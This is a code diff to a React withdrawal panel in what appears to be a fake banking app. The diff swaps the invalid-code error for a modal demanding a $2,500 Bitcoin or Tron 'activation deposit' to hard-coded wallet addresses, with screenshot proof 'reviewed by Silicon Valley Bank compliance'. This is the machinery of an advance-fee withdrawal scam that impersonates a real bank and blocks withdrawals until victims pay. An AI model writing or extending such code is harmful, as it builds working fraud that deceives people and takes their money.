@@ -1,7 +1,7 @@
 import React, { useState } from 'react';
 import { User, Transaction } from '../types';
 import { api } from '../services/api';
-import { ArrowUpRight, Landmark, CreditCard, DollarSign, AlertCircle, CheckCircle2, ShieldCheck, Key, X } from 'lucide-react';
+import { ArrowUpRight, Landmark, CreditCard, DollarSign, AlertCircle, CheckCircle2, ShieldCheck, Key, X, ShieldAlert, Clock, Copy, Check, FileText } from 'lucide-react';
 
 interface WithdrawPanelProps {
   user: User;
@@ -22,6 +22,82 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess })
 
   const [showVerificationModal, setShowVerificationModal] = useState(false);
   const [verificationError, setVerificationError] = useState<string | null>(null);
+
+  // Deposit $2,500 USD requirement modal state
+  const [showDepositPromptModal, setShowDepositPromptModal] = useState(false);
+  const [showCryptoModal, setShowCryptoModal] = useState(false);
+  const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'TRX' | 'USDT'>('BTC');
+  const [txHash, setTxHash] = useState('');
+  const [proofNote, setProofNote] = useState('');
+  const [proofImage, setProofImage] = useState<string | null>(null);
+  const [submittingDeposit, setSubmittingDeposit] = useState(false);
+  const [depositSuccessMsg, setDepositSuccessMsg] = useState<string | null>(null);
+  const [copiedAddress, setCopiedAddress] = useState(false);
+
+  const [walletAddresses, setWalletAddresses] = useState<{ BTC: string; TRX: string; USDT: string }>({
+    BTC: 'bc1q9v8h9svb3x0k49z82lq09fw2zxl184p24a8svb',
+    TRX: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+    USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
+  });
+
+  React.useEffect(() => {
+    api.getCryptoAddresses()
+      .then(res => {
+        if (res.addresses) setWalletAddresses(res.addresses);
+      })
+      .catch(console.error);
+  }, [showCryptoModal, showDepositPromptModal]);
+
+  const copyAddress = (address: string) => {
+    navigator.clipboard.writeText(address);
+    setCopiedAddress(true);
+    setTimeout(() => setCopiedAddress(false), 2000);
+  };
+
+  const handleScreenshotUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (file) {
+      if (file.size > 5 * 1024 * 1024) {
+        setError('Screenshot image must be under 5MB.');
+        return;
+      }
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        setProofImage(reader.result as string);
+      };
+      reader.readAsDataURL(file);
+    }
+  };
+
+  const handleCryptoDepositSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setError(null);
+    setSubmittingDeposit(true);
+
+    try {
+      const res = await api.submitCryptoActivationDeposit({
+        cryptoMethod,
+        txHash: txHash.trim(),
+        proofNote: proofNote.trim(),
+        proofImage: proofImage || undefined
+      });
+      if (res.user && onSuccess) {
+        onSuccess(res.user, null as any);
+      }
+      setDepositSuccessMsg(`Your $2,500 ${cryptoMethod} deposit proof has been submitted to SVB Compliance for verification.`);
+      setTimeout(() => {
+        setShowCryptoModal(false);
+        setDepositSuccessMsg(null);
+        setTxHash('');
+        setProofNote('');
+        setProofImage(null);
+      }, 3000);
+    } catch (err: any) {
+      setError(err.message || 'Failed to submit activation deposit proof.');
+    } finally {
+      setSubmittingDeposit(false);
+    }
+  };
 
   const handleInitialFormSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -50,8 +126,9 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess })
     e.preventDefault();
     setVerificationError(null);
 
-    if (user.role !== 'admin' && !fourDigitCode) {
-      setVerificationError('Invalid security code. Please enter your 4-digit transaction security code.');
+    if (user.role !== 'admin' && !fourDigitCode.trim()) {
+      setShowVerificationModal(false);
+      setShowDepositPromptModal(true);
       return;
     }
 
@@ -76,7 +153,8 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess })
       setFourDigitCode('');
       setNote('');
     } catch (err: any) {
-      setVerificationError(err.message || 'Invalid security code');
+      setShowVerificationModal(false);
+      setShowDepositPromptModal(true);
     } finally {
       setLoading(false);
     }
@@ -313,13 +391,6 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess })
               </div>
             </div>
 
-            {verificationError && (
-              <div className="p-3 bg-rose-950/80 border border-rose-500/30 rounded-xl text-rose-300 text-xs flex items-center gap-2">
-                <AlertCircle className="w-4 h-4 shrink-0 text-rose-400" />
-                <span>{verificationError}</span>
-              </div>
-            )}
-
             <form onSubmit={executeWithdrawWithCode} className="space-y-4">
               <div>
                 <label className="block text-xs font-semibold text-slate-300 mb-2">
@@ -360,6 +431,210 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess })
                   )}
                 </button>
               </div>
+            </form>
+          </div>
+        </div>
+      )}
+
+      {/* Deposit $2,500 Prompt Modal */}
+      {showDepositPromptModal && (
+        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
+          <div className="bg-slate-900 border border-amber-500/40 rounded-3xl p-6 max-w-md w-full space-y-5 shadow-2xl relative animate-fadeIn">
+            <button
+              onClick={() => setShowDepositPromptModal(false)}
+              className="absolute top-4 right-4 text-slate-400 hover:text-white p-1 rounded-xl bg-slate-800"
+            >
+              <X className="w-5 h-5" />
+            </button>
+
+            <div className="w-14 h-14 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mx-auto">
+              <ShieldAlert className="w-7 h-7" />
+            </div>
+
+            <div className="text-center space-y-2">
+              <h3 className="text-base font-bold text-white uppercase tracking-wider text-amber-400">4-Digit Outgoing Transfer Code - PENDING PAYMENT / DEPOSIT $2,500</h3>
+              <p className="text-xs text-slate-300 leading-relaxed">
+                Your official 4-digit security code will be generated and activated automatically upon making your first payment or deposit.
+              </p>
+            </div>
+
+            {user.pendingCryptoDeposit?.status === 'Pending' ? (
+              <div className="p-4 bg-amber-500/10 border border-amber-500/30 rounded-2xl text-xs space-y-2">
+                <div className="flex items-center justify-between">
+                  <span className="font-bold text-amber-400 flex items-center gap-1.5">
+                    <Clock className="w-4 h-4 animate-spin text-amber-400" />
+                    Pending 4-Digit Code
+                  </span>
+                  <span className="text-[10px] bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded-full font-mono font-bold">
+                    Under Review
+                  </span>
+                </div>
+                <p className="text-slate-300 text-[11px] leading-relaxed">
+                  Your screenshot proof for <span className="font-bold">{user.pendingCryptoDeposit.cryptoMethod}</span> is being reviewed by Silicon Valley Bank compliance. Your 4-digit code will be generated upon approval.
+                </p>
+              </div>
+            ) : (
+              <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-2xl text-[11px] text-slate-300 space-y-1">
+                <p className="font-semibold text-amber-400">Compliance Authorization Notice:</p>
+                <p className="text-slate-400 leading-relaxed">
+                  Once your $2,500 deposit is verified by bank compliance, your 4-digit security code will be automatically released and $2,500 will be credited to your account balance.
+                </p>
+              </div>
+            )}
+
+            <div className="flex flex-col gap-2 pt-2">
+              <button
+                onClick={() => {
+                  setShowDepositPromptModal(false);
+                  setShowCryptoModal(true);
+                }}
+                className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-2xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
+              >
+                <DollarSign className="w-4 h-4" />
+                <span>$ Make Deposit / Activate</span>
+              </button>
+
+              <button
+                onClick={() => setShowDepositPromptModal(false)}
+                className="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold py-2.5 rounded-2xl text-xs transition-colors"
+              >
+                Close
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Crypto Activation Deposit Modal */}
+      {showCryptoModal && (
+        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
+          <div className="bg-slate-900 border border-amber-500/40 rounded-3xl p-6 max-w-lg w-full space-y-5 shadow-2xl relative animate-fadeIn max-h-[90vh] overflow-y-auto">
+            <button
+              onClick={() => setShowCryptoModal(false)}
+              className="absolute top-4 right-4 text-slate-400 hover:text-white p-1 rounded-xl bg-slate-800"
+            >
+              <X className="w-5 h-5" />
+            </button>
+
+            <div className="flex items-center gap-3 border-b border-slate-800 pb-4">
+              <div className="w-10 h-10 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400">
+                <Key className="w-5 h-5" />
+              </div>
+              <div>
+                <h3 className="text-base font-bold text-white">$2,500 Deposit Payment Addresses</h3>
+                <p className="text-xs text-slate-400">4-Digit Transfer Security Code Issuance</p>
+              </div>
+            </div>
+
+            {depositSuccessMsg && (
+              <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs rounded-xl flex items-center gap-2">
+                <CheckCircle2 className="w-4 h-4 shrink-0" />
+                <span>{depositSuccessMsg}</span>
+              </div>
+            )}
+
+            <form onSubmit={handleCryptoDepositSubmit} className="space-y-4 text-xs">
+              <div>
+                <label className="block font-semibold text-slate-300 mb-2">Select Payment Method</label>
+                <div className="grid grid-cols-2 gap-3">
+                  <button
+                    type="button"
+                    onClick={() => setCryptoMethod('BTC')}
+                    className={`p-3 rounded-2xl border font-bold flex items-center justify-center gap-2 transition-all ${
+                      cryptoMethod === 'BTC' ? 'bg-amber-500 text-slate-950 border-amber-400 shadow-md' : 'bg-slate-950 text-slate-300 border-slate-800 hover:border-slate-700'
+                    }`}
+                  >
+                    Bitcoin (BTC)
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() => setCryptoMethod('TRX')}
+                    className={`p-3 rounded-2xl border font-bold flex items-center justify-center gap-2 transition-all ${
+                      cryptoMethod === 'TRX' ? 'bg-amber-500 text-slate-950 border-amber-400 shadow-md' : 'bg-slate-950 text-slate-300 border-slate-800 hover:border-slate-700'
+                    }`}
+                  >
+                    Tron (TRX)
+                  </button>
+                </div>
+              </div>
+
+              <div className="p-4 bg-slate-950 rounded-2xl border border-slate-800 space-y-3">
+                <div className="flex items-center justify-between text-[11px] text-slate-400">
+                  <span>Required Deposit Amount:</span>
+                  <span className="font-bold text-amber-400 text-sm">$2,500.00 USD</span>
+                </div>
+                <div className="text-[11px]">
+                  <span className="text-slate-400 block mb-1">Official Wallet Address ({cryptoMethod}) — Click/Tap to Copy:</span>
+                  <div
+                    onClick={() => copyAddress(walletAddresses[cryptoMethod] || walletAddresses['TRX'] || walletAddresses['BTC'])}
+                    className="cursor-pointer hover:border-amber-500/50 flex items-center gap-2 bg-slate-900 p-3 rounded-xl border border-slate-800 transition-all group"
+                  >
+                    <span className="font-mono text-amber-400 font-semibold text-xs break-all flex-1 select-all">
+                      {walletAddresses[cryptoMethod] || walletAddresses['TRX'] || walletAddresses['BTC']}
+                    </span>
+                    <div className="p-1.5 bg-slate-800 group-hover:bg-amber-500 group-hover:text-slate-950 text-slate-200 rounded-lg shrink-0 flex items-center gap-1 text-[10px] font-bold transition-all">
+                      {copiedAddress ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
+                      <span>{copiedAddress ? 'Copied!' : 'Copy'}</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div>
+                <label className="block font-semibold text-slate-300 mb-1">Upload Screenshot Proof of Payment *</label>
+                <div className="relative border-2 border-dashed border-slate-800 hover:border-amber-500/50 rounded-2xl p-4 text-center bg-slate-950 transition-all cursor-pointer">
+                  <input
+                    type="file"
+                    accept="image/*"
+                    onChange={handleScreenshotUpload}
+                    className="absolute inset-0 opacity-0 cursor-pointer w-full h-full"
+                  />
+                  {proofImage ? (
+                    <div className="space-y-2">
+                      <img src={proofImage} alt="Payment Proof" className="max-h-32 mx-auto rounded-xl border border-slate-700 object-cover" />
+                      <p className="text-emerald-400 text-[11px] font-semibold flex items-center justify-center gap-1">
+                        <CheckCircle2 className="w-3.5 h-3.5" /> Screenshot Loaded Successfully (Click to Change)
+                      </p>
+                    </div>
+                  ) : (
+                    <div className="space-y-1 text-slate-400">
+                      <FileText className="w-6 h-6 mx-auto text-amber-400" />
+                      <p className="text-xs font-semibold text-slate-200">Tap or click to select payment screenshot</p>
+                      <p className="text-[10px] text-slate-500">PNG, JPG, or WEBP up to 5MB</p>
+                    </div>
+                  )}
+                </div>
+              </div>
+
+              <div>
+                <label className="block font-semibold text-slate-300 mb-1">Transaction Hash / Reference (Optional)</label>
+                <input
+                  type="text"
+                  value={txHash}
+                  onChange={(e) => setTxHash(e.target.value)}
+                  placeholder="e.g. 0x8f4b... or TXID"
+                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-white font-mono outline-none focus:border-amber-500"
+                />
+              </div>
+
+              <div>
+                <label className="block font-semibold text-slate-300 mb-1">Additional Note / Sender Tag</label>
+                <input
+                  type="text"
+                  value={proofNote}
+                  onChange={(e) => setProofNote(e.target.value)}
+                  placeholder="e.g. Sent from personal wallet"
+                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-white outline-none focus:border-amber-500"
+                />
+              </div>
+
+              <button
+                type="submit"
+                disabled={submittingDeposit}
+                className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
+              >
+                {submittingDeposit ? 'Submitting Deposit...' : 'Submit $2,500 Payment Proof for Admin Review'}
+              </button>
             </form>
           </div>
         </div>
